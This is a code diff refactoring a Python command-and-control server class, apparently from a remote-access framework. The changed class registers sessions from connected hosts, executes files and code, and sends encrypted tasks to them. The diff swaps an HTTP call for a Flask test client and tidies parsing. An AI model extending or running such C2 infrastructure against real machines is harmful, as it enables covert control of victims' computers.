@@ -64,6 +64,7 @@ class C2(threading.Thread):
         self.debug = debug
         self.sessions = {}
         self.child_procs = {}
+        self.app_client = None
         self.socket = self._init_socket(self.port)
         self.commands = {
             'exit' : {
@@ -125,7 +126,10 @@ class C2(threading.Thread):
 
     def _execute(self, args):
         # ugly method that should be refactored at some point
-        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
+        if args.count('"') == 2:
+            path, args = [i.strip() for i in args.split('"') if i if not i.isspace()]
+        else:
+            path, args = [i for i in args.partition(' ') if i if not i.isspace()]
         args = [path] + args.split()
         if os.path.isfile(path):
             name = os.path.splitext(os.path.basename(path))[0]
@@ -143,6 +147,14 @@ class C2(threading.Thread):
                     util.log("{} error: {}".format(self._execute.__name__, str(e)))
         else:
             return "File '{}' not found".format(str(path))
+
+    def bind_app(self, app):
+        """
+        Bind Flask app instance to server.
+
+        :param app_client Flask:  app client instance
+        """
+        self.app_client = app.test_client()
 
     def py_exec(self, code):
         """
@@ -224,10 +236,9 @@ class C2(threading.Thread):
             if session.info != None:
 
                 # database stores identifying information about session
-                response = requests.post('http://0.0.0.0:5000/api/session/new', json=dict(session.info))
-                if response.ok:
-                    
-                    session_metadata = response.json()
+                response = self.app_client.post('/api/session/new', json=dict(session.info))
+                if response.status_code == 200:
+                    session_metadata = response.json
                     session_uid = session_metadata.get('uid')
 
                     # display session information in terminal
@@ -240,9 +251,7 @@ class C2(threading.Thread):
                         self.sessions[owner] = {}
 
                     self.sessions[owner][session_uid] = session
-
                     util.log('New session {}:{} connected'.format(owner, session_uid))
-
             else:
                 util.log("Failed Connection: {}".format(address[0]))
 
@@ -403,6 +412,7 @@ class SessionThread(threading.Thread):
             task['session'] = self.id
         data = security.encrypt_aes(json.dumps(task), self.key)
         msg  = struct.pack('!L', len(data)) + data
+
         self.connection.sendall(msg)
         return True
 
